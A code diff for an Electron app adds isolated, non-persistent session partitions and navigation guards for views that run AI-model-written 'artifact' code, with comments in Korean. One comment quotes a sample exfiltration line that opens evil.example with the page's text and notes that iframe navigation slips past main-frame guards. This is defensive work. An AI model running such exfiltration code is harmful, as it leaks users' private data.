@@ -1,6 +1,8 @@
 import { BrowserWindow, WebContentsView, shell } from 'electron'
 import type { WebContents } from 'electron'
-import { BROWSER_PARTITION, IPC, PREVIEW_PARTITION } from '@shared/types'
+import { BROWSER_PARTITION, IPC, PREVIEW_PARTITION, artifactPartition } from '@shared/types'
+import { ARTIFACT_ORIGIN } from '@shared/artifactUrl'
+import { ensureArtifactSessionFor } from './artifactProtocol'
 import type { HostedViewKind, HostedViewLayout } from '@shared/types'
 import { windowBackgroundColor } from './windows'
 import { log } from './logger'
@@ -89,17 +91,63 @@ export function applyGuestGuards(contents: WebContents): void {
  * 그 경우다 — 모델이 쓴 코드가 우리 dev 서버의 쿠키·스토리지에 닿는 것은 이 파티션 분리가
  * 막으려던 바로 그것이다. 여기서 컴파일이 깨지면 세션을 어디에 둘지 반드시 고르게 된다.
  */
-export function partitionFor(kind: HostedViewKind): string {
+export function partitionFor(kind: HostedViewKind, workspaceId: string): string {
   switch (kind) {
     case 'dev':
       return PREVIEW_PARTITION
     case 'web':
       return BROWSER_PARTITION
+    // 모델이 쓴 코드다. 워크스페이스마다 갈라 두고 **영속하지 않는다** — 앱이 사는 동안에도
+    // 스토리지가 워크스페이스 경계를 넘으면 안 된다([[shared/types]] artifactPartition).
+    case 'artifact':
+      return artifactPartition(workspaceId)
     default: {
       const unhandled: never = kind
       throw new Error(`webViews: no session partition chosen for kind "${String(unhandled)}"`)
     }
   }
+}
+
+/**
+ * 아티팩트 게스트에게 거는 이동 가드 — dev·웹과 갈라지는 이유가 여기 다 있다.
+ *
+ * 위 `applyGuestGuards` 는 http(s) 이동을 **허용**하고 새 창 요청을 사용자의 기본 브라우저로
+ * 넘긴다. 미리보는 것이 사용자 자신의 dev 서버나 사용자가 친 주소라면 맞는 판단이다.
+ *
+ * 모델이 쓴 코드에는 그게 유출 통로다:
+ *
+ * ```js
+ * window.open('https://evil.example/?d=' + encodeURIComponent(document.body.innerText))
+ * ```
+ *
+ * 이 한 줄이 사용자의 **진짜 브라우저**를 열어 방금 읽은 저장소 내용을 실어 보낸다. CSP 로는
+ * 못 막는다 — `navigate-to` 지시문은 표준에서 빠졌고 Chromium 에 없다. 그래서 이동은 세션
+ * 단위로 따로 막아야 한다.
+ *
+ * `will-navigate` 만으로는 부족하다 — 그건 **메인 프레임 전용**이다. 아티팩트가 iframe 을
+ * 만들어 그 안에서 이동하면 통과한다. `will-frame-navigate` 가 서브프레임까지 덮는다.
+ * (둘 다 `loadURL` 로는 안 뜨므로 우리가 버전을 갈아 끼우는 경로는 영향받지 않고, 해시
+ * 이동에도 안 떠서 아티팩트 안의 `<a href="#toc">` 는 그대로 동작한다.)
+ */
+function applyArtifactGuards(contents: WebContents): void {
+  contents.setWindowOpenHandler(({ url }) => {
+    log.info(`artifact: blocked a new window to ${url}`)
+    return { action: 'deny' }
+  })
+
+  const allowed = (url: string): boolean => url.startsWith(`${ARTIFACT_ORIGIN}/`)
+
+  contents.on('will-navigate', (event, url) => {
+    if (allowed(url)) return
+    event.preventDefault()
+    log.info(`artifact: blocked navigation to ${url}`)
+  })
+
+  contents.on('will-frame-navigate', (details) => {
+    if (allowed(details.url)) return
+    details.preventDefault()
+    log.info(`artifact: blocked frame navigation to ${details.url}`)
+  })
 }
 
 /** 뷰 하나를 만들 때 강제하는 설정. 예전 `will-attach-webview` 가 하던 일을 그대로 옮겼다. */
@@ -156,10 +204,16 @@ export class HostedViewManager {
       return
     }
 
-    const view = new WebContentsView({ webPreferences: guestWebPreferences(partitionFor(kind)) })
+    const partition = partitionFor(kind, workspaceId)
+    // 아티팩트 세션은 게으르게 선다. 뷰가 생기기 **전**인 지금이 유일하게 안전한 자리다 —
+    // 여기서 안 세우면 첫 loadURL 이 핸들러 없는 스킴을 만난다([[main/artifactProtocol]]).
+    if (kind === 'artifact') ensureArtifactSessionFor(partition)
+    const view = new WebContentsView({ webPreferences: guestWebPreferences(partition) })
     // 첫 프레임 전과 리사이즈로 드러나는 가장자리에 흰 판이 번쩍이지 않게 앱 배경을 깔아 둔다.
     view.setBackgroundColor(windowBackgroundColor())
-    applyGuestGuards(view.webContents)
+    // 모델이 쓴 코드는 아무 데도 못 간다. 사용자의 dev 서버·웹 탭과 규칙이 다르다.
+    if (kind === 'artifact') applyArtifactGuards(view.webContents)
+    else applyGuestGuards(view.webContents)
 
     const entry: Entry = {
       view,
